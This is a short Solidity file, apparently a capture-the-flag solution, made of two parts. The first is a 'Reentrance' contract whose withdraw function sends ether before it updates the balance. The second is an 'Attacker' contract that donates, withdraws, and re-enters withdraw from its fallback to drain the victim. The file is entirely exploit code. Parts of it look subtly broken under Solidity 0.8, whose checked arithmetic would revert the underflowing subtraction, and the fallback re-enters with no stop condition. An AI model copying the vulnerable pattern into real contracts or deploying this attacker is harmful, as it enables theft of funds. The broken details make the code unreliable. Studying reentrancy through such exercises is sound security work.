// in remix IDE
pragma solidity ^0.8.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result, bytes memory data) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  fallback() external payable {}
}

contract Attacker{
	Reentrance victim;
	
	constructor(address payable target){
	    victim = Reentrance(target);
	}
	    

	function steal() payable public {
		victim.donate{value: 1 ether}(address (this));
		victim.withdraw(1 ether);
	}

	fallback() external payable {
		victim.withdraw(1 ether);

	}
}